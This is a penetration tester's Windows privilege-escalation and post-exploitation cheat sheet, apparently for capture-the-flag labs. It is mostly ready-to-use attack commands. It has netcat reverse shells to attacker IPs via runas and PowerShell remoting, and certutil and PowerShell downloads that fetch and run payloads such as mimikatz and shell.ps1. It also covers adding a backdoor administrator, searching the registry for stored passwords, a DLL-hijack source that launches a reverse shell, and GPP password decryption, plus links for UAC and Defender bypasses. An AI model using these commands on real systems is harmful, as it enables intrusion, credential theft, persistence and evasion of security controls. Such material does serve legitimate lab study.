
__Interesting reads__
```
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
http://soclevelone.com/index.php/2019/01/14/bypassing-windows-uac/
https://www.metahackers.pro/spawing-tty-shells/
https://netsec.ws/?p=337
https://hackingandsecurity.blogspot.com/2017/07/upgrading-simple-shells-to-fully.html
https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/
https://www.gracefulsecurity.com/privesc-dll-hijacking/
```

__Awesome gits/gists__
```
https://github.com/Cn33liz/p0wnedShell
https://github.com/PowerShellMafia/PowerSploit
https://github.com/trustedsec/unicorn
https://gist.github.com/FrankSpierings/
https://gist.github.com/babutzc/f68f5414fc8595ca8f80abbe36d7b946
https://github.com/GDSSecurity/Windows-Exploit-Suggester
https://github.com/besimorhino/powercat
https://github.com/reider-roque/pentest-tools/tree/master/password-cracking/gpprefdecrypt
https://github.com/SecWiki/windows-kernel-exploits
```

__Sysinternal tools__
```
https://download.sysinternals.com/files/PSTools.zip
```

__Windows build numbers + year__
```
https://www.gaijin.at/en/infos/windows-version-numbers
https://github.com/SecWiki/windows-kernel-exploits.git
```

#### Gather info
__cmd.exe__
```
whoami
echo %username%
systeminfo
hostname
net use
net view
net user
net user <username>
net localgroup
set
findstr /C:"<autoElevate>true" 
schtasks /query /fo LIST /v | findstr "tomcat"
```
__Powershell__
```
$ExecutionContext.SessionState.LanguageMode
$Env:Path
Get-volume
hostname
get-process
get-service
Get-NetFirewallRule
Get-Childitem
Get-Content
```

For more Powershell stuff, i recommend __Babutzc__ his gist. Loads of commands and extra stuff :)
> https://gist.github.com/babutzc/f68f5414fc8595ca8f80abbe36d7b946

The 'ConstrainedLanguage' is more a thing these days. When trying to escalate privileges it can be usefull to look for a way to break out into 'FullLanguage' mode. 

> https://ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass

### Execute commands as a different user
Execute commands as different user when stored credentials are availeble (cmd.exe)
```
runas /user:.\Pieter /savecred 'nc.exe -e cmd.exe 10.10.10.17 6666'
```

Execute commands as different user on powershell.
```
$username = "pieter"
$password = "Welkom01"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$Session    = New-PSSession -Credential $Credential
Invoke-Command -Session $Session  -ScriptBlock { nc.exe -e cmd.exe 10.10.10.17 443 }
```

#### Adding users
Quickly add a user to the system. If admin privs are also acquired, add the user to the admin group. 
```
net user appel Welkom01 /add
net localgroup administrators appel /add
```

#### Cleartext passwords
Looking for cleartext passwords?
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml

%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

reg query "HKCU\Software\ORL\WinVNC3\Password"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Open ports
TCP / UDP sockets
```
netstat -ano
```

### Routes
```
route print
```

#### MSF Post modules Windows
If you ever use a MSF, here are some usefull post modules. 
```
use exploit/windows/local/service_permissions
post/windows/gather/credentials/gpp
run post/windows/gather/credential_collector 
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
```

#### Transfering files
__Kali__
Set up simple webserver using python. 
```
python3 -m http.server 80
```


__CMD__
Use cmd to download files. 
``` 
certutil -urlcache -split -f "http://10.11.0.158/mimikatz.exe" mim.exe
certutil.exe -urlcache -split -f "http://10.11.0.158/mimikatz.exe" %TMP%\mim.exe
``` 

__Powershell__
Use Powershell to download files. 
```
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')
powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
powershell.exe wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe"
IEX (new-object System.Net.WebClient).DownloadString('http://10.10.14.13/shell.ps1')
wget
curl
powershell -c -e {base64} 
``` 

__SMB__
Set up smb share to copy files.
```
kali) 	python /usr/share/doc/python-impacket/examples/smbserver.py APPEL /tmp/APPEL
Wind) 	net view \\10.10.10.158

		dir \\10.10.10.17\APPEL
	
		Download a file
		copy \\10.10.10.17\APPEL\nc.exe .

		From target to attacker
		copy nc2.exe \\10.10.14.17\SHARE\nc2.exe
```

#### Mounting shares
cmd stuff

```
net use Y: \\10.10.10.25\C$ /USER:Pieter "Welkom01" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:Pieter "Welkom01" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:FEEST\Pieter "Welkom01" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:.\Pieter "Welkom01" /PERSISTENT:YES
```

Without creds (currentuser)
```
net use Y: \\127.0.0.1\C$
```


#### Processes for current user
__Powershell__
```
get-process
```

```
$View = @(
 @{l='Handles';e={$_.HandleCount}},
 @{l='NPM(K)';e={ (Get-Process -Id $_.ProcessId).NonpagedSystemMemorySize/1KB -as [int]}},
 @{l='PM(K)';e={ $_.PrivatePageCount/1KB -as [int]}},
 @{l='WS(K)';e={ $_.WorkingSetSize/1KB -as [int]}},
 @{l='VM(M)';e={ $_.VirtualSize/1mB -as [int]}},
 @{l='CPU(s)';e={ (Get-Process -Id $_.ProcessId).CPU -as [int]}},
 @{l='Id';e={ $_.ProcessId}},
 'UserName'
 @{l='ProcessName';e={ $_.ProcessName}}
)
Get-WmiObject Win32_Process | % { $_ | 
    Add-Member -MemberType ScriptProperty -Name UserName -Value {
        '{0}\{1}' -f $this.GetOwner().Domain,$this.GetOwner().User
    } -Force -PassThru
} | ? UserName -match pieter | ft $View -AutoSize
```

#### Usefull Windows binarys

```
sigcheck64.exe
```

Example
```
sigcheck64.exe -m C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe -accepteula
```
```xml
</trustInfo>
<asmv3:application>
   <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <autoElevate>true</autoElevate>
   </asmv3:windowsSettings>
</asmv3:application>
</assembly>
```


#### Create custom DLL file

Preconfigure enviroment
```bash
apt install mingw-w64
```
Save file as main.cpp
```c++
#include <windows.h>
int executeCommand()
{
 WinExec("C:\\Users\\Pieter\\Documents\\revshell.exe", 0);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 executeCommand();
 return 0;
}
```
Build the .dll
```
i686-w64-mingw32-c++ -c -DBUILDING_EXAMPLE_DLL main.cpp
i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a 
```

UAC Bypass Server 2019
```
https://egre55.github.io/system-properties-uac-bypass/
```

#### ADDS stuff

Exploring domain shares and finding groups.xml
```
\\feest.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
```

```bash
cat groups.xml
```

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```
python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPIsStilAThing2019
```

### Defender bypasses

Defender bypasses (may 2019)
```
https://github.com/Genetic-Malware/Ebowla
```

More to come. 
